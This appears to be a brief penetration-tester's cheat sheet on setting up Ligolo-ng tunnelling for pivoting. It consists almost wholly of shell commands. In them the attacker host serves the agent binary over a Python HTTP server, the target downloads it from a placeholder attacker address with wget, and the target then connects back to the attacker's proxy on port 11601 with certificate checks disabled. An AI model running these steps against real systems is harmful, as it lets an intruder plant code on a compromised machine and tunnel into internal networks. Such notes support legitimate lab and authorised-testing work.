# Ligolo-ng way
## 1. Setup ligolo-ng on attacker host
```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

## 2.  Start Python Server
```shell
python3 -m http.server
```

## 3. Download ligolo Agent onto Target from Attack Host
```shell
wget http://PWNIP:8000/agent
```

# 4. Start Server on Attack Host with Self Cert Option
```shell
sudo ./proxy -selfcert
```

## 5. Connect from Target Host to Server
```shell
chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
```